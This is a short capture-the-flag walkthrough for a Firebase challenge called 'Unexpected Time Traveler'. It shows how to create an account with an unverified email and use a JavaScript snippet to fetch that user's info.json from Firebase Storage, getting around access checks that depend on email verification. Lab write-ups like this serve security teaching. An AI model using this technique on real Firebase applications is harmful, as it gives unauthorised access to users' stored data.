# Flag 1 - Unexpected Time Traveler

1. Signup an account with a valid email.
1. Confirm your email and complete registration.
1. Login with your email and see that user info is update to:
   ```
   gs://$project_id.appspot.com/users/" + firebase.auth().currentUser.email + "/info.json
   ```
1. Notice that the ``currentUser.emailVerified`` property is set to ``true`` and that the description is about an *unverifed time traveler*.
1. Create a user without a verified email address and fetch the corresponding ``info.json`` using the code from ``main.js``
   ```js
   firebase
   .auth()
   .createUserWithEmailAndPassword("fake@fake.com","noimportant")
   .then(() => {
        user = firebase.auth().currentUser;
        ref = firebase.storage().ref(`/users/${user.email}/info.json`)
        ref.getDownloadURL().then((url) => {
            fetch(url).then((resp) => 
                resp.json().then((json) => {
                    console.log(json);
                })
            )
        })
   })
   
   ```
